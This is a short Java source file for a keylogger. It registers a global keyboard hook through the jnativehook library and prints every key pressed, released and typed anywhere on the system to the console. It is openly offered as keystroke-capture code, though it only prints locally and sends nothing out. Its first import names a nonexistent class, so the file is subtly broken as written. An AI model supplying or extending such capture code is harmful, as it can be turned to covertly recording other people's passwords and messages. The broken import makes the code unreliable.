import javax.xml.bind.JAXBElement.GlobalScope;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger implements NativeKeyListener {

	public static void main(String[] args) {

		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			e.printStackTrace();
		}
		
		GlobalScreen.addNativeKeyListener(new KeyLogger());
		
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		
		System.out.println("nativeKeyPressed : "+NativeKeyEvent.getKeyText(e.getKeyCode()));
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		
		System.out.println("nativeKeyReleased : "+NativeKeyEvent.getKeyText(e.getKeyCode()));	
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent e) {
		
		System.out.println("nativeKeyTyped : "+NativeKeyEvent.getKeyText(e.getKeyCode()));	
		
	}

}
